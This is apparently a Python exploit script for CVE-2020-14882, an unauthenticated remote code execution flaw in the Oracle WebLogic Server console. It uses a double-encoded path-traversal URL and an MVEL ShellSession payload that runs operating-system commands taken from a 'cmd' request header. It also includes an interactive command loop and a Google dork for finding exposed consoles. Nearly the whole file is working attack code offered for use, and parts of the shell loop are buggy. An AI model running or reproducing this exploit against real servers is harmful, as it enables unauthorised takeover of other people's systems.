#!/usr/bin/env python3
# -*- coding-utf-8 _*_

import textwrap
import http.client
import fire
from loguru import logger

import requests

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

headers = {
	"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15;rv:73.0)Gecko/20100101 Firefox/73.0",
	"Accept" : "application/json,text/plain,*/*",
	"Accept-Language" : "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
	"Accept-Encoding" : "gzip,deflate",
	"Upgrade-Insecure-Requests" : "1",
	"Content-Type" : "application/x-www-form-urlencoded",
	"Cache-Control" : "max-age=0",
	"Connection" : "close"
}

proxies = {
	'http' : '127.0.0.1:8080'
}

class OracleWeblogic(object):
	"""
	CVE: CVE-2020-14882 - Oracle WebLogic Server Unauthenticated - RCE
	Version: 12.2.1.0
	Exploit Author: CHackA0101
	Google Dork: inurl:"/console/login/LoginForm.jsp"

	Reference:
		https://www.exploit-db.com/exploits/49479
		https://raw.githubusercontent.com/chacka0101/exploits/master/CVE-2020-14882/CVE-2020-14882.py
		https://github.com/chacka0101/exploits/blob/master/CVE-2020-14882/README.md
		https://www.oracle.com/security-alerts/cpuoct2020.html
		https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html
	
		Usage:
		    python3 exploit.py http(s)://target:7001
	"""
	def __init__(self, url) -> None:
		self.url = url

	def exploit(self):
		url = self.url + """/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec();");"""
		response = requests.get(url, headers = headers)
		url = self.url + "/console/images/%252E%252E%252Fconsole.portal"

		payload = textwrap.dedent("""\ 
			_nfpb=false&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession("weblogic.work.ExecuteThread executeThread=(weblogic.work.ExecuteThread)Thread.currentThread();
			weblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();
			java.lang.reflect.Field field = adapter.getClass().getDeclaredField("connectionHandler");
			field.setAccessible(true);
			Object obj = field.get(adapter);
			weblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod("getServletRequest").invoke(obj);
			String cmd = req.getHeader("cmd");
			String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe","/c", cmd} : new String[]{"/bin/sh","-c", cmd};
			if (cmd != null) {
				String result = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter("\\\A").next();
				weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod("getResponse").invoke(req);
				res.getServletOutputStream().writeStream(new weblogic.xml.util.StringInputStream(result));
				res.getServletOutputStream().flush();
				res.getWriter().write("");}executeThread.interrupt();");""")
		
		if response.status_code == 200:
			logger.info("(Load Headers ...)")
			logger.info("(Data urlencode ...)")
			logger.info("(Execute exploit ...)")
			logger.info("(CHackA0101-GNU/Linux)$ Successful Exploitation.")
			while True:
				command = input("(CHackA0101GNU/Linux)$ ")
				if command == "exit":
					break
				new_headers = headers.update({
					'cmd': command,
					'Content-Length':'1244',
				})
				try:
					response = requests.post(url, data = payload, headers = headers, stream = True)
					logger.info(response.text)
					break
				except:
					new_headers.update(headers)
					pass
		else:
			logger.error("(CHackA0101-GNU/Linux)$ Fail.")

if __name__ == '__main__':
	fire.Fire(OracleWeblogic)